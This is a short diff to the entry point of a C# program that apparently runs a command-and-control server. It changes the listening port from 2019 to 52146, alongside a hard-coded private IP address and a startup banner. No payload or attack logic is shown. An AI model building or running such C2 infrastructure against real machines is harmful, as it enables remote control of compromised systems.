@@ -10,7 +10,7 @@ namespace CC
     {
         static void Main(string[] args)
         {
-            int curr_port = 2019;
+            int curr_port = 52146;
             string curr_ip = "192.168.43.164";
             Console.WriteLine("Command and control server {0} active", "Hadas&roteM");
             CCServer ccs = new CCServer(curr_port, curr_ip);
